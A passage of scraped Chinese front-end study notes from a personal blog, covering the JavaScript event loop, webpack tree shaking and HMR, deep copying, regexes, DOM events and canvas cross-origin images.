()&#123; console.log(1) await fn2() console.log(2) // 阻塞&#125;async function fn2 ()&#123; console.log(&#x27;fn2&#x27;)&#125;fn1()console.log(3) 上面的例子中，await 会阻塞下面的代码（即加入微任务队列），先执行 async 外面的同步代码，同步代码执行完，再回到 async 函数中，再执行之前阻塞的代码 所以上述输出结果为：1，fn2，3，2 Node中的事件循环机制事件循环分为6个阶段： timers:执行timer的回调，即setTimeout,setInterval里面的回调函数 I/O事件回调阶段：执行延迟到下一个循环迭代的I/O阶段，即上一轮循环中未被执行的一些I/O回调 idle,prepare(闲置阶段):仅内部使用 poll(轮询阶段)：检查新的I/O事件，执行与I/O相关的回调，（几乎所有情况下，除了关闭的回调函数，那些由计时器和setImmediate（）调度的之外），其余情况node将在适当的时候在此阻塞 check(检查阶段)：setImmediate()回调函数在这里执行 close callback（关闭事件回调阶段）：一些关闭的回调函数，如socket.on(‘close’,…) 除了上述6个阶段，还存在process.nextTick,其不属于事件循环的任何一个阶段，它属于该阶段与下阶段之间的过渡，即本阶段执行结束，进入下一个阶段前要执行的回调，类似插队 在Node中，同样存在宏任务和微任务，与浏览器的事件循环相似 微任务： next tick queue:process.nextTick other queue:Promise的then回调，queueMicrotask 宏任务： timer queue:setTimeout,setInterval poll queue:IO事件 check queue:setImmediate close queue:close事件 执行顺序： next tick microtask queue other microtask queue timer queue poll queue check queue close queue 12345678910111213141516171819202122232425262728293031323334353637async function async1() &#123; console.log(&#x27;async1 start&#x27;) await async2() console.log(&#x27;async1 end&#x27;)&#125;async function async2() &#123; console.log(&#x27;async2&#x27;)&#125;console.log(&#x27;script start&#x27;)setTimeout(function () &#123; console.log(&#x27;setTimeout0&#x27;)&#125;, 0)setTimeout(function () &#123; console.log(&#x27;setTimeout2&#x27;)&#125;, 300)setImmediate(() =&gt; console.log(&#x27;setImmediate&#x27;));process.nextTick(() =&gt; console.log(&#x27;nextTick1&#x27;));async1();process.nextTick(() =&gt; console.log(&#x27;nextTick2&#x27;));new Promise(function (resolve) &#123; console.log(&#x27;promise1&#x27;) resolve(); console.log(&#x27;promise2&#x27;)&#125;).then(function () &#123; console.log(&#x27;promise3&#x27;)&#125;)console.log(&#x27;script end&#x27;) 分析过程： 先找到同步任务，输出script start 遇到第一个 setTimeout，将里面的回调函数放到 timer 队列中 遇到第二个 setTimeout，300ms后将里面的回调函数放到 timer 队列中 遇到第一个setImmediate，将里面的回调函数放到 check 队列中 遇到第一个 nextTick，将其里面的回调函数放到本轮同步任务执行完毕后执行 执行 async1函数，输出 async1 start 执行 async2 函数，输出 async2，async2 后面的输出 async1 end进入微任务，等待下一轮的事件循环 遇到第二个，将其里面的回调函数放到本轮同步任务执行完毕后执行 遇到 new Promise，执行里面的立即执行函数，输出 promise1、promise2 then里面的回调函数进入微任务队列 遇到同步任务，输出 script end 执行下一轮回到函数，先依次输出 nextTick 的函数，分别是 nextTick1、nextTick2 然后执行微任务队列，依次输出 async1 end、promise3 执行timer 队列，依次输出 setTimeout0 接着执行 check 队列，依次输出 setImmediate 300ms后，timer 队列存在任务，执行输出 setTimeout2 执行结果如下： 12345678910111213script startasync1 startasync2promise1promise2script endnextTick1nextTick2async1 endpromise3setTimeout0setImmediatesetTimeout2 最后有一道是关于setTimeout与setImmediate的输出顺序 1234567setTimeout(() =&gt; &#123; console.log(&quot;setTimeout&quot;);&#125;, 0);setImmediate(() =&gt; &#123; console.log(&quot;setImmediate&quot;);&#125;); 输出情况： 1234567情况一：setTimeoutsetImmediate情况二：setImmediatesetTimeout 分析下流程： 外层同步代码一次性全部执行完，遇到异步API就塞到对应的阶段 遇到setTimeout，虽然设置的是0毫秒触发，但实际上会被强制改成1ms，时间到了然后塞入times阶段 遇到setImmediate塞入check阶段 同步代码执行完毕，进入Event Loop 先进入times阶段，检查当前时间过去了1毫秒没有，如果过了1毫秒，满足setTimeout条件，执行回调，如果没过1毫秒，跳过 跳过空的阶段，进入check阶段，执行setImmediate回调 这里的关键在于这1ms，如果同步代码执行时间较长，进入Event Loop的时候1毫秒已经过了，setTimeout先执行，如果1毫秒还没到，就先执行了setImmediate","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"箭头函数和普通函数区别","slug":"箭头函数和普通函数区别","date":"2022-05-02T03:21:43.000Z","updated":"2022-05-02T03:37:43.528Z","comments":true,"path":"2022/05/02/箭头函数和普通函数区别/","link":"","permalink":"https://coloey.github.io/2022/05/02/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%E5%92%8C%E6%99%AE%E9%80%9A%E5%87%BD%E6%95%B0%E5%8C%BA%E5%88%AB/","excerpt":"","text":"箭头函数和普通函数区别 语法更加简洁清晰 箭头函数不会创建自己的this 所以它不会有自己的this,它只会从自己的作用域链的上一层继承this，作用域链包括全局作用域，块作用域和函数作用域 箭头函数继承而来的this指向永远不变 对象obj的方法b时用箭头函数定义的，这个函数中的this永远指向它定义时所处的全局环境中的this,即使这个函数是作为对象obj的方法调用，它依然指向window对象 call()/apply()/bind()无法改变箭头函数中this得指向 call()/apply()/bind()方法可以用来动态修改this的指向，但由于箭头函数的this定义时就已经确定且永远不会改变，所以使用这些犯法永远也改变不了箭头函数this的指向，但是代码也不会报错 箭头函数不能用作构造函数调用 构造函数的new原理： 箭头函数是ES6中的提出来的，它没有prototype，也没有自己的this指向，更不可以使用arguments参数，所以不能New一个箭头函数。 new操作符的实现步骤如下： 1、创建一个空的简单JavaScript对象（即{}）； 2、为步骤1新创建的对象添加属性__proto__，将该属性链接至构造函数的原型对象 ； 3、将步骤1新创建的对象作为this的上下文 ； 4、如果该函数没有返回对象，则返回this。 所以，上面的第二、三步，箭头函数都是没有办法执行的。 箭头函数不能用作Generator函数，不能使用yield关键字","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"tree shaking","slug":"tree-shaking","date":"2022-05-01T14:15:55.000Z","updated":"2022-05-02T15:28:56.323Z","comments":true,"path":"2022/05/01/tree-shaking/","link":"","permalink":"https://coloey.github.io/2022/05/01/tree-shaking/","excerpt":"","text":"tree shaking如何工作的呢？虽然 tree shaking 的概念在 1990 就提出了，但直到 ES6 的 ES6-style 模块出现后才真正被利用起来。 在ES6以前，我们可以使用CommonJS引入模块：require()，这种引入是动态的，也意味着我们可以基于条件来导入需要的代码 但是CommonJS规范无法确定在实际运行前需要或者不需要某些模块，所以CommonJS不适合tree-shaking机制。在 ES6 中，引入了完全静态的导入语法：import。 因为tree shaking只能在静态modules下工作。ECMAScript 6 模块加载是静态的,因此整个依赖树可以被静态地推导出解析语法树。所以在 ES6 中使用 tree shaking 是非常容易的。 tree shaking的原理是什么? ES6 Module引入进行静态分析，故而编译的时候正确判断到底加载了哪些模块 静态分析程序流，判断哪些模块和变量未被使用或者引用，进而删除对应代码 使用将文件标记为无副作用(side-effect-free)在一个纯粹的 ESM 模块世界中，识别出哪些文件有副作用很简单。然而，我们的项目无法达到这种纯度，所以，此时有必要向 webpack 的 compiler 提供提示哪些代码是“纯粹部分”。 这种方式是通过 package.json 的 &quot;sideEffects&quot; 属性来实现的。 1234&#123; &quot;name&quot;: &quot;your-project&quot;, &quot;sideEffects&quot;: false&#125; 如同上面提到的，如果所有代码都不包含副作用，我们就可以简单地将该属性标记为 false，来告知 webpack，它可以安全地删除未用到的 export 导出。 「副作用」的定义是，在导入时会执行特殊行为的代码，而不是仅仅暴露一个 export 或多个 export。举例说明，例如 polyfill，它影响全局作用域，并且通常不提供 export。 压缩输出通过如上方式，我们已经可以通过 import 和 export 语法，找出那些需要删除的“未使用代码(dead code)”，然而，我们不只是要找出，还需要在 bundle 中删除它们。为此，我们将使用 -p(production) 这个 webpack 编译标记，来启用 uglifyjs 压缩插件。 注意，--optimize-minimize 标记也会在 webpack 内部调用 UglifyJsPlugin。 从 webpack 4 开始，也可以通过 &quot;mode&quot; 配置选项轻松切换到压缩输出，只需设置为 &quot;production&quot;。 webpack.config.js 1234567891011const path = require(&#x27;path&#x27;);module.exports = &#123; entry: &#x27;./src/index.js&#x27;, output: &#123; filename: &#x27;bundle.js&#x27;, path: path.resolve(__dirname, &#x27;dist&#x27;)- &#125;+ &#125;,+ mode: &quot;production&quot;&#125;; 注意，也可以在命令行接口中使用 --optimize-minimize 标记，来使用 UglifyJSPlugin。为了学会使用 tree shaking，你必须…… 使用 ES2015 模块语法（即 import 和 export）。 在项目 package.json 文件中，添加一个 “sideEffects” 入口。 引入一个能够删除未引用代码(dead code)的压缩工具(minifier)（例如 UglifyJSPlugin）。","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"},{"name":"webpack","slug":"前端工程化/webpack","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack/"}],"tags":[]},{"title":"HMR","slug":"HMR","date":"2022-05-01T09:42:46.000Z","updated":"2022-05-07T13:04:50.817Z","comments":true,"path":"2022/05/01/HMR/","link":"","permalink":"https://coloey.github.io/2022/05/01/HMR/","excerpt":"","text":"是什么HMR 全称是Hot Module Replacement,理解为模块热替换，指在应用程序运行过程中，替换，添加，删除模块，而无需重新刷新整个应用。 例如，我们在应用运行过程中修改了某个模块，通过自动刷新会导致整个应用的整体刷新，那页面中的状态信息都会丢失，如果使用HME，就可以实现只将修改的模块实时替换至应用中，不必完全舒心整个应用。 在webpack中配置热模块： webpack.config.js 1234567const webpack=require(&#x27;webpack&#x27;)module.exports=&#123; ... devServer:&#123; hot:true &#125;&#125; 通过上述这种配置，如果我们修改并保存CSS文件，确实能够以不刷新地形式更新到页面中，但是，当我们修改并保存js文件之后，页面依旧舒刷新了，这里并没有触发热模块，所以，HMR并不像Webpack的其他特性一样可以开箱即用，需要取指定那些模块发生更新时进行HMR 12345if(module.hot)&#123; module.hot.accept(&#x27;./util.js&#x27;,()=&gt;&#123; console.log(&#x27;utils.js更新了&#x27;) &#125;)&#125; 实现原理 Webpack Compile:将JS源代码编译成bundle.js HMR Server:用来将热更新的文件输出给HMR Runtime Bundle Server:静态资源文件服务器，提供文件访问路径 HMR Runtime:socket服务器，会被注入到浏览器，更新文件的变化 bundle.js:构建输出的文件 在HMR Runtime和HMR Server之间建立websocket，即图上4号线，用于实时更新文件变化 分成两个阶段： 启动阶段为1-2-A-B 在编写未经过webpack打包的源码后，Webpack Compile将源码和HMR Runtime一起编译成bundle文件，传输Bundle Server静态资源服务器 更新阶段为1-2-3-4 当某一个文件或者模块发生变化时，webpack监听到文件变化对文件重新编译打包，编译生成唯一的hash值，这个hash值用来作为下一次热更新的标识，根据变化的内容生成两个补丁文件:manifest(包含了hash和chunkId,用来说明变化的内容)和chunk.js模块，由于socket服务器在HMR Runtime和HMR Server之间建立websocket链接，单文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的hash值，如下图的h属性，做为下一次热更新的标识 在浏览器接收到这条消息之前，浏览器已经在上一次socket消息中记住了此时的hash标识，这时候我们会创建一个ajax去服务端请求获取到变化内容的manifest文件 manifest文件包含重新build生成的hash值，以及变化的模块，对应上图的c属性,浏览器根据manifest文件获取模块变化的内容，从而触发render流程，实现局部模块更新 总结关于webpack热模块更新总结： 通过webpack-dev-server创建两个服务器，提供静态资源的服务(express)和Socket服务 express server负责直接提供静态资源的服务（打包后的资源直接被浏览器请求和解析） socket server是一个websocket的长连接，双方可以通信 当socket server监听到对应的模块发生变化时，会生成两个文件.json(manifest文件)和.js文件(update chunk) 通过长连接，socket server可以直接将这两个文件主动发送给客户端（浏览器） 浏览器拿到两个新的文件后，通过HMR runtime机制，加载这两个文件，并且针对修改的模块进行更新","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"},{"name":"webpack","slug":"前端工程化/webpack","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack/"}],"tags":[]},{"title":"手写object.freeze","slug":"手写object-freeze","date":"2022-04-30T14:04:32.000Z","updated":"2022-05-29T07:45:44.375Z","comments":true,"path":"2022/04/30/手写object-freeze/","link":"","permalink":"https://coloey.github.io/2022/04/30/%E6%89%8B%E5%86%99object-freeze/","excerpt":"","text":"object.freeze()=不可扩展（preventExtensions)+不可配置(configurable:false)+不可写(writable:fasle) object.seal()=不可扩展+不可配置 preventExtensions=不可添加属性+不可改__proto__ 123456789101112131415161718192021222324252627const _objectFreeze = object =&gt; &#123; // 补全代码 //Object.defineProperty(object,) const props=Object.getOwnPropertyNames(object); props.forEach(prop=&gt;&#123; const des=Object.getOwnPropertyDescriptor(object,prop); if(des.get||des.set)&#123; Object.defineProperty(object,prop,&#123; configurable:false,//小写 writable:false, get:des.get, set:des.set &#125;) &#125;else&#123; Object.defineProperty(object,prop,&#123; configurable:false, writable:false, &#125;) &#125; &#125;) return Object.preventExtensions(object); &#125; 数据属性的值不可更改，访问器属性（有getter和setter）也同样（但由于是函数调用，给人的错觉是还是可以修改这个属性）。如果一个属性的值是个对象，则这个对象中的属性是可以修改的，除非它也是个冻结对象。数组作为一种对象，被冻结，其元素不能被修改。没有数组元素可以被添加或移除。 这个方法返回传递的对象，而不是创建一个被冻结的副本。","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/tags/JavaScript/"}]},{"title":"常见正则表达式","slug":"常见正则表达式","date":"2022-04-30T07:23:53.000Z","updated":"2022-08-25T02:18:25.249Z","comments":true,"path":"2022/04/30/常见正则表达式/","link":"","permalink":"https://coloey.github.io/2022/04/30/%E5%B8%B8%E8%A7%81%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"","text":"匹配邮箱： {username@hostname.com|edu|info) 1/^[A-Za-z0-9]+([-.][A-Za-z0-9]+)*@[A-Za-z0-9]+(\\.[A-Za-z0-9]+)*\\.[A-Za-z]&#123;2,6&#125;$/ 用户名可以包含点号和连字符，但是用户名以字符开头因此用/\\w+[-.\\w+]*,但是\\w会匹配ASCII字母和数字，但有些系统中\\w能够匹配非ASCII字母，，因此将\\w换成[-A-Za-z0-9],结尾的域名一般在2-6个字符 匹配URL 比如匹配http或者https开头的url 1/^((http|https)):\\/\\/)?[-A-Za-z0-9]+(\\.[A-Za-z0-9]+)*\\.[A-Za-z]&#123;2,6&#125;[a-zA-Z0-9_:\\@&amp;?=+,.!~%*\\$]*(?&lt;![.,?!])$/ 主机名仍然为[A-Za-z0-9]+(.[A-Za-z0-9]+)*.[A-Za-z]{2,6}，路径名[a-zA-Z0-9_:@&amp;?=+,.!~%*$]*可有可无，结尾不能是./?!这些符号 或者 根据题目要求判断参数URL是否合法。首先URL结构一般包括协议、主机名、主机端口、路径、请求信息、哈希，而本题协议已给出为HTTP(S)，使用正则匹配URL，核心步骤有： 首先必须是以http(s)开头并且可以不包含协议头部信息 主机名可以使用”-“符号，所以两种情况都要判断，包含”-“或不包含”-“ 顶级域名很多，直接判断”.”之后是否为字母即可 最后判断端口、路径和哈希，这些参数可有可无 参考答案： 1234const _isUrl = url =&gt; &#123; return /^((http|https):\\/\\/)?(([A-Za-z0-9]+-[A-Za-z0-9]+|[A-Za-z0-9]+)\\.)+([A-Za-z]+)(:\\d+)?(\\/.*)?(\\?.*)?(#.*)?$/.test(url)&#125; 匹配手机号 手机号一般是1开头，第二位只能是3-9，最多9个数字 1/^1[3-9]\\d&#123;9&#125;$&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://coloey.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"DOM事件","slug":"DOM事件","date":"2022-04-29T15:07:41.000Z","updated":"2022-05-02T15:47:58.141Z","comments":true,"path":"2022/04/29/DOM事件/","link":"","permalink":"https://coloey.github.io/2022/04/29/DOM%E4%BA%8B%E4%BB%B6/","excerpt":"","text":"Dom事件流 DOM2事件流分为3个阶段：事件捕获，到达目标和事件冒泡，事件捕获最先发生，为提前拦截事件提供了可能，然后，实际的目标元素接收到事件后，最后一个阶段是冒泡，最迟要在这个阶段响应事件。 实际目标（div元素）在补货阶段不会接收到事件，这是因为捕获阶段从document到html到body就结束，下一个阶段，即会在div元素上触发事件的‘到达目标阶段，通常在事处理中被认为是事件冒泡的第一部分，然后，冒泡阶段开始，事件反转传播到文档 事件处理程序 HTML事件处理程序: 这种交互能力是通过为onclick属性指定JavaScript代码值实现。 showMessage()函数时单独在script元素中定义，也可以在外部文件定义，作为事件处理程序的代码可以访问全局作用域中的一切 123456&lt;script&gt; function showMessage()&#123; console.log(&#x27;hello world&#x27;)&#125; &lt;/script&gt;&lt;input type=&#x27;button&#x27; value=&#x27;Click me&#x27; onclick=&quot;showMessage()&quot;/&gt; DOM0事件处理程序 每个元素（包括window和document）都有通常小写的事件处理程序属性，比如onclick,只要把这个属性赋值为一个函数即可 12345let btn=document.getElementById(&#x27;myBtn&#x27;);btn.onclick=function()&#123; console.log(this.id)//myBtn &#125; 所赋函数被视为元素的方法，因此，事件处理程序会在元素的作用域中运行，即this等于元素以这种方式添加事件处理程序时注册在事件流的冒泡阶段 通过将事件处理程序属性的值设置为null，可以移除通过Dom0添加的事件处理程序 DOM2事件处理程序 DOM2 Events为事件处理程序的赋值和移除定义了两个方法：addEventListener()和removeEventListener(),它们接收3个参数：事件名，事件处理函数和一个布尔值，true表示在捕获阶段调用事件处理程序，false(默认值)表示在冒泡阶段调用事件处理程序 1234let btn=document.getElementById(&quot;myBtn&quot;)btn.addEventListener(&#x27;click&#x27;,()=&gt;&#123; console.log(this.id)&#125;,false) 使用DOM2的主要优势是可以为同一个事件添加多个事件处理程序 通过addEventListener()添加的事件处理程序通过removeEventListener()移除要传入与添加时同样的参数，因此无法使用addEventListener()添加的匿名函数移除 12345678let btn=document.getElementById(&quot;myBtn&quot;)btn.addEventListener(&#x27;click&#x27;,()=&gt;&#123; console.log(this.id)&#125;,false)btn.removeEventListener(&#x27;click&#x27;,()=&gt;&#123; console.log(this.id)&#125;,false)//没有效果 123456let handler=()=&gt;&#123; console.log(this.id)&#125;let btn=document.getElementById(&quot;myBtn&quot;)btn.addEventListener(&#x27;click&#x27;,handler,false);btn.removeEventListener(&#x27;click&#x27;,handler,false)//有效果 事件对象 DOM事件对象 event对象时传给事件处理程序唯一参数 在事件处理程序内部，this对象始终等于currentTarget的值，而target只包含事件的实际目标，如果事件处理程序直接添加在了意图目标，则this,currentTarget,target的值一样 如果添加在父结点上，则不一样 12345document.body.onclick=function(e)&#123; console.log(e.currentTarget===document.body);//true console.log(this===document.body)//true console.log(e.target===document.getElementById(&#x27;myBtn&#x27;))//true&#125; this和currentTarget等于document.body:它是注册事件处理程序的元素 target属性等于按钮本身：按钮时click的真正目标 由于按钮本身没有注册事件处理程序，因此click事件冒泡到document.body，触发了在它上面注册的处理程序 type属性可以处理多个事件 preventDefault()方法用于阻止特定事件的默认动作，比如链接的默认行为是在被单击时导航到href属性指定的URL，阻止这个导航可以在onclick事件处理程序中取消，通过preventDefault()取消默认行为，事件对象的cancleable属性被设为true stopPropagation()方法用于立即阻止事件流在DOM结构中传播，取消后序事件的捕获或冒泡。 123456789let btn=document.getElementById(&quot;myBtn&quot;)btn.addEventListener(&#x27;click&#x27;,()=&gt;&#123; console.log(this.id) event.stopPropagation();&#125;)document.body.onclick=function()&#123; console.log(&#x27;body click&#x27;)&#125; 由于click事件不会传播到document.body，因此onclick事件处理程序永远不会执行 eventPhase用于确定事件流所处阶段，如果事件处理程序在捕获阶段被调用，则eventphase等于1，到达目标阶段为2，冒泡阶段为3 123456789101112let btn=document.getElementById(&#x27;myBtn&#x27;)btn.onclick=function(e)&#123; console.log(e.eventPhase);//2&#125;document.body.addEventListener(&#x27;click&#x27;,(e)=&gt;&#123; console.log(e.eventPhase);//1&#125;)document.body.onclick=function(e)&#123; console.log(e.eventPhase);//3 &#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"深拷贝与浅拷贝","slug":"深拷贝与浅拷贝","date":"2022-04-29T10:16:43.000Z","updated":"2022-07-23T08:10:41.839Z","comments":true,"path":"2022/04/29/深拷贝与浅拷贝/","link":"","permalink":"https://coloey.github.io/2022/04/29/%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D/","excerpt":"","text":"一、数据类型存储前面文章我们讲到，JavaScript中存在两大数据类型： 基本类型 引用类型 基本类型数据保存在在栈内存中 引用类型数据保存在堆内存中，引用数据类型的变量是一个指向堆内存中实际对象的引用，存在栈中 二、浅拷贝浅拷贝，指的是创建新的数据，这个数据有着原始数据属性值的一份精确拷贝 如果属性是基本类型，拷贝的就是基本类型的值。如果属性是引用类型，拷贝的就是内存地址 即浅拷贝是拷贝一层，深层次的引用类型则共享内存地址 下面简单实现一个浅拷贝 123456789function shallowClone(obj)&#123; let newObj=&#123;&#125;; for(let prop in obj)&#123; if(obj.hasOwnProperty(prop))&#123; newObj.prop=obj.prop; &#125; &#125; return newObj;&#125; 在JavaScript中，存在浅拷贝的现象有： Object.assign Array.prototype.slice(), Array.prototype.concat() 使用拓展运算符实现的复制 Object.assign()123456789101112var obj = &#123; age: 18, nature: [&#x27;smart&#x27;, &#x27;good&#x27;], names: &#123; name1: &#x27;fx&#x27;, name2: &#x27;xka&#x27; &#125;, love: function () &#123; console.log(&#x27;fx is a great girl&#x27;) &#125;&#125;var newObj = Object.assign(&#123;&#125;, fxObj); slice()12345const fxArr = [&quot;One&quot;, &quot;Two&quot;, &quot;Three&quot;]const fxArrs = fxArr.slice(0)fxArrs[1] = &quot;love&quot;;console.log(fxArr) // [&quot;One&quot;, &quot;Two&quot;, &quot;Three&quot;]console.log(fxArrs) // [&quot;One&quot;, &quot;love&quot;, &quot;Three&quot;] concat()12345const fxArr = [&quot;One&quot;, &quot;Two&quot;, &quot;Three&quot;]const fxArrs = fxArr.concat()fxArrs[1] = &quot;love&quot;;console.log(fxArr) // [&quot;One&quot;, &quot;Two&quot;, &quot;Three&quot;]console.log(fxArrs) // [&quot;One&quot;, &quot;love&quot;, &quot;Three&quot;] 拓展运算符12345const fxArr = [&quot;One&quot;, &quot;Two&quot;, &quot;Three&quot;]const fxArrs = [...fxArr]fxArrs[1] = &quot;love&quot;;console.log(fxArr) // [&quot;One&quot;, &quot;Two&quot;, &quot;Three&quot;]console.log(fxArrs) // [&quot;One&quot;, &quot;love&quot;, &quot;Three&quot;] 三、深拷贝深拷贝开辟一个新的栈，两个对象属完成相同，但是对应两个不同的地址，修改一个对象的属性，不会改变另一个对象的属性 常见的深拷贝方式有： _.cloneDeep() jQuery.extend() JSON.stringify() 手写循环递归 _.cloneDeep()12345678const _ = require(&#x27;lodash&#x27;);const obj1 = &#123; a: 1, b: &#123; f: &#123; g: 1 &#125; &#125;, c: [1, 2, 3]&#125;;const obj2 = _.cloneDeep(obj1);console.log(obj1.b.f === obj2.b.f);// false jQuery.extend()12345678const $ = require(&#x27;jquery&#x27;);const obj1 = &#123; a: 1, b: &#123; f: &#123; g: 1 &#125; &#125;, c: [1, 2, 3]&#125;;const obj2 = $.extend(true, &#123;&#125;, obj1);console.log(obj1.b.f === obj2.b.f); // false JSON.stringify()1const obj2=JSON.parse(JSON.stringify(obj1)); 但是这种方式存在弊端，会忽略undefined、symbol和函数,而且无法深拷贝循环引用 12345678const obj = &#123; name: &#x27;A&#x27;, name1: undefined, name3: function() &#123;&#125;, name4: Symbol(&#x27;A&#x27;)&#125;const obj2 = JSON.parse(JSON.stringify(obj));console.log(obj2); // &#123;name: &quot;A&quot;&#125; 循环递归这里用WeakMap原因：WeakMap的键名所引用的对象都是弱引用，即垃圾回收机制不将该引用考虑在内。因此，只要所引用的对象的其他引用都被清除，垃圾回收机制就会释放该对象所占用的内存。也就是说，一旦不再需要，WeakMap 里面的键名对象和所对应的键值对会自动消失，不用手动删除引用。 关于WeakMap看 []: https://www.bookstack.cn/read/es6-3rd/spilt.4.docs-set-map.md 12345678910111213141516171819202122232425262728293031323334const cloneDeep1 = (target, hash = new WeakMap()) =&gt; &#123; // 对于传入参数处理 if (typeof target !== &#x27;object&#x27; || target === null) &#123; return target; &#125; // 哈希表中存在直接返回 if (hash.has(target)) return hash.get(target); const cloneTarget = Array.isArray(target) ? [] : &#123;&#125;; hash.set(target, cloneTarget); // 针对Symbol属性 const symKeys = Object.getOwnPropertySymbols(target); if (symKeys.length) &#123; symKeys.forEach(symKey =&gt; &#123; if (typeof target[symKey] === &#x27;object&#x27; &amp;&amp; target[symKey] !== null) &#123; cloneTarget[symKey] = cloneDeep1(target[symKey]); &#125; else &#123; cloneTarget[symKey] = target[symKey]; &#125; &#125;) &#125; for (const i in target) &#123; if (Object.prototype.hasOwnProperty.call(target, i)) &#123;//调用原型链上的hasOwnProperty方法，当我们将一个属性值定义为hasOwnProperty时能够准确调用原型链上的方法 cloneTarget[i] = typeof target[i] === &#x27;object&#x27; &amp;&amp; target[i] !== null ? cloneDeep1(target[i], hash) : target[i]; &#125; &#125; return cloneTarget;&#125; 小结前提为拷贝类型为引用类型的情况下： 浅拷贝是拷贝一层，属性为对象时，浅拷贝是复制，两个对象指向同一个地址 深拷贝是递归拷贝深层次，属性为对象时，深拷贝是新开栈，两个对象指向不同的地址","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/tags/JavaScript/"}]},{"title":"line-height原理","slug":"line-height原理","date":"2022-04-29T06:06:50.000Z","updated":"2022-05-02T15:51:52.431Z","comments":true,"path":"2022/04/29/line-height原理/","link":"","permalink":"https://coloey.github.io/2022/04/29/line-height%E5%8E%9F%E7%90%86/","excerpt":"","text":"一、line-height是什么line-height 属性设置行间的距离（行高），说的直白一点，就是设置两段段文本之间的距离如果我们把一段文本的line-height设置为父容器的高度就可以实现文本垂直居中了。 二、分析其原理首先来看个图 如图，每一行文字，可看成由上间距、文本内容、下间距构成，根据行高的标准定义，行高等于两条基线之间的距离，即第一行的3-4+上下间距+第二行的1-2+2-3，因为css中每一行的上间距和下间距肯定是相等的，所以代换一下，行高就等于它本身的上间距+下间距+文本高度。因此，我们也可以把行高记为，行高就是一行的高度，这一行的高度中包含了上下两个间距和文本内容本身。而文本内容在每一行中都是居中的，所以利用这个原理，就可以实现垂直居中。 看个例子： 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; .container &#123; width: 100px; height: 200px; line-height: 200px; margin: 0 auto; border: 1px solid red; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;container&quot;&gt; 哈哈哈 &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 如上图所示。本例子中，我们设置div的高度为200px，然后里面有一行文本，我们设置了行高为200px，设置完200px后，文字本身16px不会改变，变的是它的上间距和下间距。正如上图所描述的那样。我想到这，你就应该明白了line-height为什么可以使其垂直居中了。","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"解决canvas中获取跨域图片数据问题","slug":"解决canvas中获取跨域图片数据问题","date":"2022-04-27T16:02:36.000Z","updated":"2022-04-28T08:15:03.471Z","comments":true,"path":"2022/04/28/解决canvas中获取跨域图片数据问题/","link":"","permalink":"https://coloey.github.io/2022/04/28/%E8%A7%A3%E5%86%B3canvas%E4%B8%AD%E8%8E%B7%E5%8F%96%E8%B7%A8%E5%9F%9F%E5%9B%BE%E7%89%87%E6%95%B0%E6%8D%AE%E9%97%AE%E9%A2%98/","excerpt":"","text":"为什么 canvas 认为跨域图片数据为 污染的数据当请求跨域图片数据，而未满足跨域请求资源的条件时。如果canvas使用未经跨域允许的图片的原始数据，这些是不可信的数据，可能会暴露页面的数据。 请求图片资源 - 同域Request Headers带有cookie。图片数据是被canvas信任的。 请求图片资源 - 跨域默认情况下，直接请求跨域图片。因为不符合跨域请求资源的条件，图片数据是不被canvas信任的。 为了解决图片跨域资源共享的问题， 元素提供了支持的属性：crossOrigin，该属性一共有两个值可选：anonymous 和 use-credentials，下面列举了两者的使用场景，以及满足的条件。 (anonymous:匿名的) anonymous use-credentials 用途 匿名请求跨域图片资源，不会发送证书（比如cookie等） 具名请求跨域图片资源，会携带证书数据 Request Headers origin origin、cookie Response headers Access-Control-Allow-Origin Access-Control-Allow-Origin、Access-Control-Allow-Credentials 所需条件 Access-Control-Allow-Origin 字段值需要包含请求域。 Access-Control-Allow-Origin 字段值需要包含请求域，且不能为通配符 *。Access-Control-Allow-Credentials 字段值需要为 